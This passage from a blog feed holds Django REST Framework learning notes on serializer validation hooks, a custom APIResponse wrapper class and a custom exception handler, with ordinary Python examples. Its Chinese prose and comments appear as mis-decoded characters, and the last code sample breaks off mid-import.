class="comment"># è‡ªå®šä¹‰æœ‰æ ¡éªŒè§„åˆ™çš„ååºåˆ—åŒ–å­—æ®µ,ä¾‹å¦‚ç¡®è®¤å¯†ç å­—æ®µre_pwd</span></span><br><span class="line">    re_pwd = serializers.CharField(required=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># å°ç»“ï¼š</span></span><br><span class="line">    <span class="comment"># nameï¼Œpwdï¼Œre_pwdä¸ºå¿…å¡«å­—æ®µ</span></span><br><span class="line">    <span class="comment"># phoneï¼Œsexä¸ºé€‰å¡«å­—æ®µ</span></span><br><span class="line">    <span class="comment"># äº”ä¸ªå­—æ®µéƒ½å¿…é¡»æä¾›å®Œæˆçš„æ ¡éªŒè§„åˆ™</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment"># å±€éƒ¨é’©å­ï¼švalidate_è¦æ ¡éªŒçš„å­—æ®µå(self, å½“å‰è¦æ ¡éªŒå­—æ®µçš„å€¼)</span></span><br><span class="line">    <span class="comment"># æ ¡éªŒè§„åˆ™ï¼šæ ¡éªŒé€šè¿‡è¿”å›åŸå€¼ï¼Œæ ¡éªŒå¤±è´¥ï¼ŒæŠ›å‡ºå¼‚å¸¸</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">validate_name</span><span class="params">(self, value)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">'g'</span> <span class="keyword">in</span> value.lower():  <span class="comment"># åå­—ä¸­ä¸èƒ½å‡ºç°g</span></span><br><span class="line">            <span class="keyword">raise</span> exceptions.ValidationError(<span class="string">'åå­—éæ³•ï¼Œæ˜¯ä¸ªé¸¡è´¼ï¼'</span>)</span><br><span class="line">        <span class="keyword">return</span> value</span><br><span class="line"></span><br><span class="line">    <span class="comment"># å…¨å±€é’©å­ï¼švalidate(self, é€šè¿‡ç³»ç»Ÿä¸å±€éƒ¨é’©å­æ ¡éªŒä¹‹åçš„æ‰€æœ‰æ•°æ®)</span></span><br><span class="line">    <span class="comment"># æ ¡éªŒè§„åˆ™ï¼šæ ¡éªŒé€šè¿‡è¿”å›åŸå€¼ï¼Œæ ¡éªŒå¤±è´¥ï¼ŒæŠ›å‡ºå¼‚å¸¸</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">validate</span><span class="params">(self, attrs)</span>:</span>    <span class="comment">#attrsæ˜¯å­—å…¸æ ¼å¼</span></span><br><span class="line">        pwd = attrs.get(<span class="string">'pwd'</span>)</span><br><span class="line">        re_pwd = attrs.pop(<span class="string">'re_pwd'</span>)     <span class="comment">#å› ä¸ºre_pwdä¸éœ€è¦å…¥æ•°æ®åº“ï¼Œæ‰€ä»¥åœ¨å…¨å±€é’©å­æ ¡éªŒä¸­åˆ é™¤æ‰è¿™ä¸ªå­—æ®µ</span></span><br><span class="line">        <span class="keyword">if</span> pwd != re_pwd:</span><br><span class="line">            <span class="keyword">raise</span> exceptions.ValidationError(&#123;<span class="string">'pwd&amp;re_pwd'</span>: <span class="string">'ä¸¤æ¬¡å¯†ç ä¸ä¸€è‡´'</span>&#125;)</span><br><span class="line">        <span class="keyword">return</span> attrs</span><br><span class="line"></span><br><span class="line">    <span class="comment"># è¦å®Œæˆæ–°å¢ï¼Œå¿…é¡»è‡ªå·±é‡å†™ create æ–¹æ³•ï¼Œvalidated_dataæ˜¯æ ¡éªŒçš„æ•°æ®</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(self, validated_data)</span>:</span></span><br><span class="line">        <span class="comment"># å°½é‡åœ¨æ‰€æœ‰æ ¡éªŒè§„åˆ™å®Œæ¯•ä¹‹åï¼Œæ•°æ®å¯ä»¥ç›´æ¥å…¥åº“</span></span><br><span class="line">        <span class="keyword">return</span> models.User.objects.create(**validated_data)</span><br></pre></td></tr></table></figure><h4 id="è§†å›¾å±‚-views-py-1"><a href="#è§†å›¾å±‚-views-py-1" class="headerlink" title="è§†å›¾å±‚ views.py"></a>è§†å›¾å±‚ views.py</h4><ol><li>ååºåˆ—åŒ–æ•°æ®å¿…é¡»èµ‹å€¼<code>data</code>ï¼Œç»“æœå°±æ˜¯å¾—åˆ°ä¸€ä¸ª<code>serializer</code>å¯¹è±¡</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">book_ser = serializers.UserDeserializer(data=request_data)</span><br></pre></td></tr></table></figure><ol start="2"><li>æŠŠæ•°æ®æ”¾åˆ°è‡ªå®šä¹‰<code>serializer</code>ä¸­æ ¡éªŒï¼Œæ•°æ®æ ¡éªŒæˆåŠŸè¿”å›<code>True</code>,å¤±è´¥è¿”å›<code>False</code></li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">book_ser.is_valid()</span><br></pre></td></tr></table></figure><ol start="3"><li>ä¸é€šè¿‡è¿”å› <code>book_ser.errors</code> ç»™å‰å°ï¼Œé€šè¿‡ <code>book_ser.save()</code> å¾—åˆ°æ–°å¢çš„å¯¹è±¡ï¼Œå†æ­£å¸¸è¿”å›</li></ol><p>å®Œæ•´ä»£ç ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span><span class="params">(APIView)</span>:</span></span><br><span class="line">    <span class="comment"># åªè€ƒè™‘å•å¢</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">post</span><span class="params">(self, request, *args, **kwargs)</span>:</span></span><br><span class="line">        <span class="comment"># è¯·æ±‚æ•°æ®</span></span><br><span class="line">        request_data = request.data</span><br><span class="line">        <span class="comment"># æ•°æ®æ˜¯å¦åˆæ³•ï¼ˆå¢åŠ å¯¹è±¡éœ€è¦ä¸€ä¸ªå­—å…¸æ•°æ®ï¼‰</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> isinstance(request_data, dict) <span class="keyword">or</span> request_data == &#123;&#125;:</span><br><span class="line">            <span class="keyword">return</span> Response(&#123;</span><br><span class="line">                <span class="string">'status'</span>: <span class="number">1</span>,</span><br><span class="line">                <span class="string">'msg'</span>: <span class="string">'æ•°æ®æœ‰è¯¯'</span>,</span><br><span class="line">            &#125;)</span><br><span class="line">        <span class="comment"># æ•°æ®ç±»å‹åˆæ³•ï¼Œä½†æ•°æ®å†…å®¹ä¸ä¸€å®šåˆæ³•ï¼Œéœ€è¦æ ¡éªŒæ•°æ®ï¼Œæ ¡éªŒ(å‚ä¸ååºåˆ—åŒ–)çš„æ•°æ®éœ€è¦èµ‹å€¼ç»™data</span></span><br><span class="line">        book_ser = serializers.UserDeserializer(data=request_data)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># åºåˆ—åŒ–å¯¹è±¡è°ƒç”¨is_valid()å®Œæˆæ ¡éªŒï¼Œæ ¡éªŒå¤±è´¥çš„å¤±è´¥ä¿¡æ¯éƒ½ä¼šè¢«å­˜å‚¨åœ¨ åºåˆ—åŒ–å¯¹è±¡.errors</span></span><br><span class="line">        <span class="keyword">if</span> book_ser.is_valid():</span><br><span class="line">            <span class="comment"># æ ¡éªŒé€šè¿‡ï¼Œå®Œæˆæ–°å¢</span></span><br><span class="line">            book_obj = book_ser.save()</span><br><span class="line">            <span class="keyword">return</span> Response(&#123;</span><br><span class="line">                <span class="string">'status'</span>: <span class="number">0</span>,</span><br><span class="line">                <span class="string">'msg'</span>: <span class="string">'ok'</span>,</span><br><span class="line">                <span class="string">'results'</span>: serializers.UserSerializer(book_obj).data</span><br><span class="line">            &#125;)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="comment"># æ ¡éªŒå¤±è´¥</span></span><br><span class="line">            <span class="keyword">return</span> Response(&#123;</span><br><span class="line">                <span class="string">'status'</span>: <span class="number">1</span>,</span><br><span class="line">                <span class="string">'msg'</span>: book_ser.errors,</span><br><span class="line">            &#125;)</span><br></pre></td></tr></table></figure><h1 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><ol><li>ä½¿ç”¨åºåˆ—åŒ–å™¨çš„æ—¶å€™ä¸€å®šè¦æ³¨æ„ï¼Œåºåˆ—åŒ–å™¨å£°æ˜äº†ä»¥åï¼Œä¸ä¼šè‡ªåŠ¨æ‰§è¡Œï¼Œéœ€è¦æˆ‘ä»¬åœ¨è§†å›¾ä¸­è¿›è¡Œè°ƒç”¨æ‰å¯ä»¥</li><li>åºåˆ—åŒ–å™¨æ— æ³•ç›´æ¥æ¥æ”¶æ•°æ®ï¼Œéœ€è¦æˆ‘ä»¬åœ¨è§†å›¾ä¸­åˆ›å»ºåºåˆ—åŒ–å™¨å¯¹è±¡æ—¶æŠŠä½¿ç”¨çš„æ•°æ®ä¼ é€’è¿‡æ¥ã€‚ï¼ˆ<code>data</code>, <code>instance</code>ä¼ å‚ï¼‰<ul><li>åºåˆ—åŒ–ï¼šæ˜¯æ•°æ®å¯¹è±¡ä»æ•°æ®åº“ä¸­æŸ¥å‡ºï¼Œé€šè¿‡instanceä¼ å…¥åºåˆ—åŒ–å™¨ä¸­ï¼Œå¿…é¡»é€šè¿‡dataå±æ€§æ‰èƒ½å°†åºåˆ—åŒ–åçš„æ•°æ®ä¼ ç»™å‰ç«¯ï¼Œä¸èƒ½ç›´æ¥ä¼ åºåˆ—åŒ–å¯¹è±¡</li><li>ååºåˆ—åŒ–ï¼šæ˜¯æ•°æ®æ˜¯é€šè¿‡request.dataä»å‰ç«¯è·å–åˆ°æ•°æ®ï¼Œé€šè¿‡dataä¼ å…¥åºåˆ—åŒ–å™¨ä¸­è¿›è¡Œæ ¡éªŒï¼Œä¿å­˜åˆ°æ•°æ®åº“ä¸­</li></ul></li><li>åºåˆ—åŒ–å™¨çš„å­—æ®µå£°æ˜ç±»ä¼¼äºæˆ‘ä»¬å‰é¢ä½¿ç”¨è¿‡çš„è¡¨å•ç³»ç»Ÿ</li><li>å¼€å‘restful apiæ—¶ï¼Œåºåˆ—åŒ–å™¨ä¼šå¸®æˆ‘ä»¬æŠŠæ¨¡å‹æ•°æ®è½¬æ¢æˆå­—å…¸</li><li>drfæä¾›çš„è§†å›¾ä¼šå¸®æˆ‘ä»¬æŠŠå­—å…¸è½¬æ¢æˆjsonï¼Œæˆ–è€…æŠŠå®¢æˆ·ç«¯å‘è¿‡æ¥çš„æ•°æ®è½¬æ¢æˆå­—å…¸</li></ol>]]></content>
      
      
      <categories>
          
          <category> Tech </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Backend </tag>
            
            <tag> Django </tag>
            
            <tag> Django REST Framework </tag>
            
            <tag> DRF </tag>
            
            <tag> Learning Notes </tag>
            
            <tag> Tech </tag>
            
            <tag> Dev </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Django REST Framework å­¦ä¹ ç¬”è®°ï¼ˆå…­ï¼‰ï¼šå“åº”æ¨¡å— response</title>
      <link href="/tech/drf-learning-notes-6-the-response-module/"/>
      <url>/tech/drf-learning-notes-6-the-response-module/</url>
      
        <content type="html"><![CDATA[<ul><li>Title(EN): <em><strong>Django REST Framework Learning Notes (6): the response module</strong></em></li><li>Author: dog2</li></ul><hr><h1 id="åŸºæœ¬ä¿¡æ¯"><a href="#åŸºæœ¬ä¿¡æ¯" class="headerlink" title="åŸºæœ¬ä¿¡æ¯"></a>åŸºæœ¬ä¿¡æ¯</h1><ul><li>æºç ï¼š<a href="hhttps://github.com/encode/django-rest-framework/blob/master/rest_framework/response.py"><code>rest_framework.response</code></a></li><li>å®˜æ–¹æ–‡æ¡£ï¼š<span class="exturl" data-url="aHR0cHM6Ly93d3cuZGphbmdvLXJlc3QtZnJhbWV3b3JrLm9yZy9hcGktZ3VpZGUvcmVzcG9uc2VzLw==">API Guild - Exceptions<i class="fa fa-external-link-alt"></i></span></li></ul><a id="more"></a><h1 id="æºç åˆ†æ"><a href="#æºç åˆ†æ" class="headerlink" title="æºç åˆ†æ"></a>æºç åˆ†æ</h1><p>å“åº”ç±»æ„é€ å™¨ï¼š<code>rest_framework.response.Response</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Response</span><span class="params">(SimpleTemplateResponse)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, data=None, status=None,</span></span></span><br><span class="line"><span class="function"><span class="params">                 template_name=None, headers=None,</span></span></span><br><span class="line"><span class="function"><span class="params">                 exception=False, content_type=None)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">            :param data: å“åº”æ•°æ®</span></span><br><span class="line"><span class="string">            :param status: httpå“åº”çŠ¶æ€ç </span></span><br><span class="line"><span class="string">            :param template_name: drfä¹Ÿå¯ä»¥æ¸²æŸ“é¡µé¢ï¼Œæ¸²æŸ“çš„é¡µé¢æ¨¡æ¿åœ°å€ï¼ˆä¸ç”¨äº†è§£ï¼‰</span></span><br><span class="line"><span class="string">            :param headers: å“åº”å¤´</span></span><br><span class="line"><span class="string">            :param exception: æ˜¯å¦å¼‚å¸¸äº†</span></span><br><span class="line"><span class="string">            :param content_type: å“åº”çš„æ•°æ®æ ¼å¼ï¼ˆä¸€èˆ¬ä¸ç”¨å¤„ç†ï¼Œå“åº”å¤´ä¸­å¸¦äº†ï¼Œä¸”é»˜è®¤æ˜¯jsonï¼‰</span></span><br><span class="line"><span class="string">        """</span></span><br></pre></td></tr></table></figure><h1 id="ç”¨æ³•ç¤ºä¾‹"><a href="#ç”¨æ³•ç¤ºä¾‹" class="headerlink" title="ç”¨æ³•ç¤ºä¾‹"></a>ç”¨æ³•ç¤ºä¾‹</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># statusæ˜¯è§£é‡Šä¸€å † æ•°å­— ç½‘ç»œçŠ¶æ€ç çš„æ¨¡å—</span></span><br><span class="line"><span class="keyword">from</span> rest_framework <span class="keyword">import</span> status</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä¸€èˆ¬æƒ…å†µä¸‹åªéœ€è¦è¿”å›æ•°æ®ï¼Œstatuså’Œheaderséƒ½æœ‰é»˜è®¤å€¼</span></span><br><span class="line"><span class="keyword">return</span> Response(data=&#123;æ•°æ®&#125;, status=status.HTTP_200_OK, headers=&#123;è®¾ç½®çš„å“åº”å¤´&#125;)</span><br></pre></td></tr></table></figure><h1 id="äºŒæ¬¡å°è£…Responseç±»"><a href="#äºŒæ¬¡å°è£…Responseç±»" class="headerlink" title="äºŒæ¬¡å°è£…Responseç±»"></a>äºŒæ¬¡å°è£…Responseç±»</h1><p>å¯ä»¥è‡ªå®šä¹‰APIResponseä»¥ä¾¿äºä½¿ç”¨</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> rest_framework.response <span class="keyword">import</span> Response</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">APIResponse</span><span class="params">(Response)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, data_status=<span class="number">0</span>, data_msg=<span class="string">'ok'</span>, results=None, http_status=None, headers=None, exception=False, **kwargs)</span>:</span></span><br><span class="line">        <span class="comment"># dataçš„åˆå§‹çŠ¶æ€ï¼šçŠ¶æ€ç ä¸çŠ¶æ€ä¿¡æ¯</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">'status'</span>: data_status,</span><br><span class="line">            <span class="string">'msg'</span>: data_msg,</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment"># dataçš„å“åº”æ•°æ®ä½“</span></span><br><span class="line">        <span class="comment"># resultså¯èƒ½æ˜¯Falseã€0ç­‰æ•°æ®ï¼Œè¿™äº›æ•°æ®æŸäº›æƒ…å†µä¸‹ä¹Ÿä¼šä½œä¸ºåˆæ³•æ•°æ®è¿”å›</span></span><br><span class="line">        <span class="keyword">if</span> results <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            data[<span class="string">'results'</span>] = results</span><br><span class="line">        <span class="comment"># dataå“åº”çš„å…¶ä»–å†…å®¹</span></span><br><span class="line">        <span class="comment"># if kwargs is not None:</span></span><br><span class="line">        <span class="comment">#     for k, v in kwargs.items():</span></span><br><span class="line">        <span class="comment">#         setattr(data, k, v)</span></span><br><span class="line">        data.update(kwargs)</span><br><span class="line"></span><br><span class="line">        super().__init__(data=data, status=http_status, headers=headers, exception=exception)   <span class="comment">#é‡å†™çˆ¶ç±»Responseçš„__init__æ–¹æ³•</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Tech </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Backend </tag>
            
            <tag> Django </tag>
            
            <tag> Django REST Framework </tag>
            
            <tag> DRF </tag>
            
            <tag> Learning Notes </tag>
            
            <tag> Tech </tag>
            
            <tag> Dev </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Django REST Framework å­¦ä¹ ç¬”è®°ï¼ˆäº”ï¼‰ï¼šå¼‚å¸¸æ¨¡å— exceptions</title>
      <link href="/tech/drf-learning-notes-5-the-exceptions-module/"/>
      <url>/tech/drf-learning-notes-5-the-exceptions-module/</url>
      
        <content type="html"><![CDATA[<ul><li>Title(EN): <em><strong>Django REST Framework Learning Notes (5): the exceptions module</strong></em></li><li>Author: dog2</li></ul><hr><h1 id="åŸºæœ¬ä¿¡æ¯"><a href="#åŸºæœ¬ä¿¡æ¯" class="headerlink" title="åŸºæœ¬ä¿¡æ¯"></a>åŸºæœ¬ä¿¡æ¯</h1><ul><li>æºç ï¼š<a href="https://github.com/encode/django-rest-framework/blob/master/rest_framework/exceptions.py" target="_blank" rel="noopener"><code>rest_framework.exceptions</code></a></li><li>å®˜æ–¹æ–‡æ¡£ï¼š<span class="exturl" data-url="aHR0cHM6Ly93d3cuZGphbmdvLXJlc3QtZnJhbWV3b3JrLm9yZy9hcGktZ3VpZGUvZXhjZXB0aW9ucy8=">API Guild - Exceptions<i class="fa fa-external-link-alt"></i></span></li><li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2RvZy0yL2hlbGxvX2RyZi90cmVlL21hc3Rlci9ubzVfZHJmX2V4Y2VwdGlvbg==">æœ¬æ–‡demoä»£ç Github<i class="fa fa-external-link-alt"></i></span></li></ul><h1 id="å¼‚å¸¸å¤„ç†"><a href="#å¼‚å¸¸å¤„ç†" class="headerlink" title="å¼‚å¸¸å¤„ç†"></a>å¼‚å¸¸å¤„ç†</h1><h2 id="DRFå¼‚å¸¸å¤„ç†"><a href="#DRFå¼‚å¸¸å¤„ç†" class="headerlink" title="DRFå¼‚å¸¸å¤„ç†"></a>DRFå¼‚å¸¸å¤„ç†</h2><ol><li>æ‰€æœ‰ç»è¿‡drfçš„<code>APIView</code>è§†å›¾ç±»äº§ç”Ÿçš„å¼‚å¸¸ï¼Œéƒ½å¯ä»¥æä¾›å¼‚å¸¸å¤„ç†æ–¹æ¡ˆ</li><li>drfé»˜è®¤æä¾›äº†å¼‚å¸¸å¤„ç†æ–¹æ¡ˆ<code>rest_framework.views.exception_handler</code>ï¼Œä½†æ˜¯å¤„ç†èŒƒå›´æœ‰é™</li><li>drfæä¾›çš„å¤„ç†æ–¹æ¡ˆä¸¤ç§ï¼Œå¤„ç†äº†è¿”å›å¼‚å¸¸ç°è±¡ï¼Œæ²¡å¤„ç†è¿”å›None(åç»­å°±æ˜¯æœåŠ¡å™¨æŠ›å¼‚å¸¸ç»™å‰å°)</li></ol><p>é€šå¸¸å‡ºäºä¸€äº›åŸå› æˆ‘ä»¬éœ€è¦è‡ªå®šä¹‰å¼‚å¸¸å¤„ç†ï¼Œè€Œéä½¿ç”¨DRFçš„é»˜è®¤å¼‚å¸¸ã€‚</p><h2 id="åŸºäºDRFè‡ªå®šä¹‰å¼‚å¸¸å¤„ç†"><a href="#åŸºäºDRFè‡ªå®šä¹‰å¼‚å¸¸å¤„ç†" class="headerlink" title="åŸºäºDRFè‡ªå®šä¹‰å¼‚å¸¸å¤„ç†"></a>åŸºäºDRFè‡ªå®šä¹‰å¼‚å¸¸å¤„ç†</h2><p>è‡ªå®šä¹‰å¼‚å¸¸å¤„ç†çš„å¸¸è§åº”ç”¨åœºæ™¯å¦‚ä¸‹ï¼š</p><ol><li>è§£å†³drfæ²¡æœ‰å¤„ç†çš„å¼‚å¸¸</li><li>è®©å‰å°å¾—åˆ°åˆç†çš„å¼‚å¸¸ä¿¡æ¯è¿”å›ã€éšè—å¼‚å¸¸ç»†èŠ‚è€Œè¿”å›é€šç”¨å¼‚å¸¸ä¿¡æ¯</li><li>åå°è®°å½•å¼‚å¸¸å…·ä½“ä¿¡æ¯ã€å¦‚å°†å¼‚å¸¸ç»†èŠ‚å†™å…¥æ—¥å¿—ä»¥ä¾›å®¡è®¡ç­‰</li></ol><a id="more"></a><h1 id="æºç åˆ†æ"><a href="#æºç åˆ†æ" class="headerlink" title="æºç åˆ†æ"></a>æºç åˆ†æ</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># å¼‚å¸¸æ¨¡å—ï¼šAPIViewç±»çš„dispatchæ–¹æ³•ä¸­</span></span><br><span class="line">response = self.handle_exception(exc)  <span class="comment"># ç‚¹è¿›å»</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#è‡ªå®šä¹‰å¼‚å¸¸å°±æ˜¯æä¾›å¼‚å¸¸å¤„ç†å‡½æ•°exception_handler,å¤„ç†çš„ç›®çš„å°±æ˜¯è®©responseä¸€å®šæœ‰å€¼</span></span><br><span class="line"><span class="comment">#è‡ªå®šä¹‰ï¼šè‡ªå·±å†™exception_handlerå‡½æ•°ï¼Œåœ¨è‡ªå·±çš„é…ç½®æ–‡ä»¶é…ç½®EXCEPTION_HANDLERæŒ‡å‘è‡ªå·±çš„å¤„ç†å¼‚å¸¸å‡½æ•°</span></span><br><span class="line">exception_handler = self.get_exception_handler() <span class="comment">#ç‚¹è¿›å» #è·å–å¤„ç†å¼‚å¸¸çš„æ–¹æ³•ï¼Œä¹Ÿå¯ä»¥è‡ªå®šä¹‰å¼‚å¸¸å¤„ç†æ–¹æ³•ï¼Œåœ¨settingsæ–‡ä»¶ä¸­é…ç½®</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#settingsä¸­è·å–å¼‚å¸¸å¤„ç†çš„æ–¹å¼</span></span><br><span class="line"><span class="keyword">return</span> self.settings.EXCEPTION_HANDLER</span><br><span class="line"></span><br><span class="line"><span class="comment"># APIViewç±»å±æ€§settings</span></span><br><span class="line">settings = api_settings</span><br><span class="line"></span><br><span class="line"><span class="comment"># api_settingsä¸­å®šä¹‰çš„é»˜è®¤å¼‚å¸¸å¤„ç†å‡½æ•°ï¼ŒåˆæŒ‡å‘å›äº†views.exception_handlerå‡½æ•°</span></span><br><span class="line"><span class="string">'EXCEPTION_HANDLER'</span>: <span class="string">'rest_framework.views.exception_handler'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># å¼‚å¸¸å¤„ç†çš„ç»“æœ</span></span><br><span class="line"><span class="comment"># è‡ªå®šä¹‰å¼‚å¸¸å°±æ˜¯æä¾›exception_handlerå¼‚å¸¸å¤„ç†å‡½æ•°ï¼Œå¤„ç†çš„ç›®çš„å°±æ˜¯è®©responseä¸€å®šæœ‰å€¼</span></span><br><span class="line">response = exception_handler(exc, context)   <span class="comment">#æœ€åå‘ç°åœ¨viewsä¸­çš„exception_handlerå°±æ˜¯å¤„ç†å¼‚å¸¸çš„æ–¹æ³•</span></span><br></pre></td></tr></table></figure><p>ä»<code>dispatchä¸­çš„handle_exception</code>è¿›å…¥ï¼Œ<code>get_exception_handler()</code>è·å¾—å¤„ç†å¼‚å¸¸æ–¹æ³•<code>exception_handler()</code>ï¼Œåœ¨è¿™é‡Œä¹Ÿå¯ä»¥è‡ªå®šä¹‰å¼‚å¸¸æ–¹æ³•ã€‚æ‰§è¡Œ<code>exception_handler()</code>è·å–å¼‚å¸¸å¤„ç†çš„ç»“æœã€‚</p><h1 id="ç”¨æ³•ç¤ºä¾‹"><a href="#ç”¨æ³•ç¤ºä¾‹" class="headerlink" title="ç”¨æ³•ç¤ºä¾‹"></a>ç”¨æ³•ç¤ºä¾‹</h1><h2 id="è‡ªå®šä¹‰å…¨å±€é…ç½®"><a href="#è‡ªå®šä¹‰å…¨å±€é…ç½®" class="headerlink" title="è‡ªå®šä¹‰å…¨å±€é…ç½®"></a>è‡ªå®šä¹‰å…¨å±€é…ç½®</h2><p>è¿™æ˜¯è§†é¢‘æ•™ç¨‹é‡Œçš„åšæ³•ï¼Œå®ƒå¯¹äºæ‰€æœ‰è§†å›¾éƒ½é‡‡ç”¨è‡ªå·±å®šåˆ¶çš„å¼‚å¸¸å¤„ç†å‡½æ•°ã€‚</p><ol><li>åœ¨é¡¹ç›®çš„<code>settings.py</code>ä¸­</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ä¿®æ”¹è‡ªå·±çš„é…ç½®æ–‡ä»¶setting.py</span></span><br><span class="line">REST_FRAMEWORK = &#123;</span><br><span class="line">    <span class="comment"># å…¨å±€é…ç½®å¼‚å¸¸æ¨¡å—</span></span><br><span class="line">    <span class="string">'EXCEPTION_HANDLER'</span>: <span class="string">'api.exception.exception_handler'</span>,  <span class="comment">#è®¾ç½®è‡ªå®šä¹‰å¼‚å¸¸æ–‡ä»¶è·¯å¾„ï¼Œåœ¨apiåº”ç”¨ä¸‹åˆ›å»ºexceptionæ–‡ä»¶ï¼Œexception_handlerå‡½æ•°</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="2"><li>åˆ›å»ºè‡ªå®šä¹‰å¼‚å¸¸å¤„ç†å‡½æ•°ï¼Œå‡½æ•°å†…éƒ¨é€»è¾‘ä¸€èˆ¬ä¸º<ol><li>å…ˆå°†å¼‚å¸¸å¤„ç†äº¤ç»™<code>rest_framework.views</code>çš„<code>exception_handler</code>å»å¤„ç†</li><li>åˆ¤æ–­å¤„ç†çš„ç»“æœ(è¿”å›å€¼)<code>response</code>ï¼Œæœ‰å€¼ä»£è¡¨drfå·²ç»å¤„ç†äº†ï¼Œ<code>None</code>ä»£è¡¨drfå¤„ç†ä¸äº†çš„å¼‚å¸¸ï¼Œéœ€è¦è‡ªå®šä¹‰å»å¤„ç†</li></ol></li></ol><p>apiåº”ç”¨ä¸‹åˆ›å»ºå¤„ç†å¼‚å¸¸æ–‡ä»¶exception.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># è‡ªå®šä¹‰å¼‚å¸¸å¤„ç†æ–‡ä»¶exceptionï¼Œé‡å†™exception_handlerå‡½æ•°</span></span><br><span class="line"><span class="keyword">from</span> rest_framework.views <span class="keyword">import</span> exception_handler <span class="keyword">as</span> drf_exception_handler   <span class="comment">#drfåŸç”Ÿå¤„ç†å¼‚å¸¸å‡½æ•°å–åˆ«å drf_exception_handler</span></span><br><span class="line"><span class="keyword">from</span> rest_framework.views <span class="keyword">import</span> 